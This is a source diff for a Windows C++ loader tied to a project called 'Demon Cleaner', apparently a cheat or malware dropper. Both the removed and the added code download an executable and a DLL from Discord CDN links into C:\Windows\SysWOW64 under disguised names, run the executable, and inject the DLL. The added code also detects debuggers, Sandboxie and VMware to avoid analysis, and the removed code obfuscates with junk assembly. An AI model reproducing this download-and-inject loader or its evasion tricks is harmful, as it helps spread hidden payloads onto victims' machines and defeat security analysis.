@@ -1,4 +1,3 @@
-#pragma once
 #include "../Demon Cleaner/Headers/dead.hpp"
 #include <string>
 #include <windows.h>
@@ -17,332 +16,148 @@
 #include "../Demon Cleaner/Headers/antidbg.h"
 #include <cstdio>
 #include <iostream>
-#include <filesystem>
-
+#include "loader.h"
 #pragma comment(lib, "urlmon.lib")
-#pragma comment(lib,"Wininet.lib")
-
-#define JUNK_CODE_ONE        \
-    __asm{push eax}            \
-    __asm{xor eax, eax}        \
-    __asm{setpo al}            \
-    __asm{push edx}            \
-    __asm{xor edx, eax}        \
-    __asm{sal edx, 2}        \
-    __asm{xchg eax, edx}    \
-    __asm{pop edx}            \
-    __asm{or eax, ecx}        \
-    __asm{pop eax}
-using namespace junkcode;
-void deleter()
+#pragma comment(lib,"Wininet.lib") 
+#include "../Demon Cleaner/Headers/lazy_importer.hpp"
+#include "inject.h"
+BOOL IsSandboxie()
 {
-    using namespace filesystem;
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-    
-    
-
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-}
-vector<string> serial;
-void loadserial()
-{
-    rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-
-    bool checkconnection = InternetCheckConnection("https://google.com/", FLAG_ICC_FORCE_CONNECTION, 0);
-    
-    if (!checkconnection)
-    {
-        cout << dead("You are not connected to internet...");
-        Sleep(3000);
+    if (GetModuleHandle("SbieDll.dll") != NULL)
         exit(0);
-    }
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
 
 
-    serial.push_back(dead("384604182").c_str());
-    JUNK_CODE_ONE
-    serial.push_back(dead("2953439145").c_str());
-    rydekem();
-    lnttirs();
-    tlmisir();
-
+    return FALSE;
 }
-
-
-void mainbot()
+auto RandomTitle = [](int iterations) {
+    std::string Title;
+    for (int i = 0; i < iterations; i++)
+        Title += rand() % 255 + 1;
+    return Title;
+};
+BOOL IsVMware()
 {
-    rydekem();
-    lnttirs();
-    tlmisir();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
+    BOOL bDetected = FALSE;
 
-
-
-    TCHAR volumeName[MAX_PATH + 1] = { 0 };
-    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
-    DWORD serialNumber = 0;
-    DWORD maxComponentLen = 0;
-    DWORD fileSystemFlags = 0;
-
-
-
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        rydekem();
-    lnttirs();
-    tlmisir();
-    rydekem();
-    lnttirs();
-    tlmisir();
-
-
-    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-    while (true)
+    __try
     {
-        rydekem();
-        lnttirs();
-        tlmisir();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            rydekem();
-        lnttirs();
-        tlmisir();
-
-        rydekem();
-        lnttirs();
-        tlmisir();
-        if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
+        __asm
         {
-            __asm
-            {
-                jmp short Label1
-                _emit 0xB2
-                _emit 0xB9
-                _emit 0x44
-                _emit 0xED
-                _emit 0xB4
-                Label2:
-                jmp short Label3
-                    _emit 0xF9
-                    _emit 0x7C
-                    _emit 0xB8
-                    _emit 0x81
-                    _emit 0x76
-                    Label1:
-                jmp short Label2
-                    _emit 0x90
-                    _emit 0x84
-                    _emit 0x48
-                    _emit 0x6F
-                    _emit 0xA8
-                    Label3:
-                jmp short Label4
-                    _emit 0xEC
-                    _emit 0x2A
-                    _emit 0x77
-                    _emit 0x20
-                    _emit 0x7C
-                    Label4:
-                jmp short Label5
-                    _emit 0xCD
-                    _emit 0x75
-                    _emit 0xB8
-                    _emit 0x46
-                    _emit 0xFD
-                    Label5:
-            }
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-            string filename = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
-            ifstream ifile(filename);
-            if (ifile)
-            {
-                system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-                system(dead("start audio-for-stability.exe").c_str());
-                system(dead("cls").c_str());
-                
-            }
-            else
-            {
-                __asm
-                {
-                    jmp short caca1
-                    _emit 0x6F
-                    _emit 0x77
-                    _emit 0xD9
-                    _emit 0xF1
-                    _emit 0xDF
-                    caca2:
-                    jmp short caca3
-                        _emit 0x6C
-                        _emit 0x64
-                        _emit 0x6E
-                        _emit 0x89
-                        _emit 0xB6
-                        caca1:
-                    jmp short caca2
-                        _emit 0x54
-                        _emit 0x4F
-                        _emit 0xA0
-                        _emit 0xD8
-                        _emit 0xF5
-                        caca3:
-                    jmp short caca4
-                        _emit 0x22
-                        _emit 0xD9
-                        _emit 0xD9
-                        _emit 0x07
-                        _emit 0x07
-                        caca4:
-                    jmp short caca5
-                        _emit 0xDF
-                        _emit 0xA5
-                        _emit 0x5E
-                        _emit 0x33
-                        _emit 0xA0
-                        caca5:
-                }
-                
-                std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891304130897915964/Demon_Cleaner.exe").c_str());
-                std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
-                URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
-                system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
-
-                std::string dll = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891653781832486972/server.dll").c_str());
-                std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
-                URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
-
-                system(dead("start audio-for-stability.exe").c_str());
-                system(dead("cls").c_str());
-               
-            }
-                
-           
-            
-
-            return exit(0);
+            mov    ecx, 0Ah
+            mov    eax, 'VMXh'
+            mov    dx, 'VX'
+            in    eax, dx
+            cmp    ebx, 'VMXh'
+            sete    al
+            movzx   eax, al
+            mov    bDetected, eax
         }
-        else
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        return FALSE;
+    }
+
+    return bDetected;
+    if (bDetected)
+    {
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE VM Detected && ECHO You got detected using VM Workstation . && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+    }
+}
+int main()
+{
+    SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
+
+    std::string dll = (dead("https://cdn.discordapp.com/attachments/834754431249285140/891653781832486972/server.dll").c_str());
+    std::string dllpath = (dead("C:\\Windows\\SysWOW64\\audio.dll").c_str());
+    URLDownloadToFileA(NULL, dll.c_str(), dllpath.c_str(), 0, NULL);
+    injector();
+    Sleep(1000);
+
+    
+
+    if (IsDebuggerPresent())
+    {
+
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        SetLastError(1);
+        exit(0);
+        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+    }
+    if (GetLastError == 0)
+    {
+
+        IsSandboxie();
+        IsVMware();
+        bool checkconnection = InternetCheckConnection("https://google.com/", FLAG_ICC_FORCE_CONNECTION, 0);
+        if (!checkconnection)
         {
-            rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-
-            system(dead("cls").c_str());
-            std::cout << CYAN << (dead("Sorry but you are not in our database. ").c_str()) << std::endl;
-            std::cout << GREEN << (dead("Hwid : ").c_str());
-            std::cout << serialNumber << std::endl;
-            Sleep(10000);
-            rydekem();
-            lnttirs();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                rydekem();
-            lnttirs();
-            tlmisir();
-            rydekem();
-            lnttirs();
-            tlmisir();
-            
-
+            system(dead("start cmd /c START CMD /C \"COLOR C && TITLE No Internet && ECHO You are not connected to the internet . && TIMEOUT 10 >nul").c_str());
+            Sleep(3000);
             exit(0);
-            return exit(0);
+            LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
+            LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+        }
+        
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            loadserial();
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            mainbot();
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            FreeConsole();
+            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        
         
 
-
-            
-        }
     }
+    else
+    {
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        system(dead("start cmd /c START CMD /C \"COLOR C && TITLE Banned && ECHO You have been banned for using reverse engineering tools against our software . && TIMEOUT 10 >nul").c_str());
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        exit(0);
+        LI_FN(VirtualProtect).in(LI_MODULE("kernel32.dll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("ntdll").cached());
+        LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+    }
+   
 }
+           
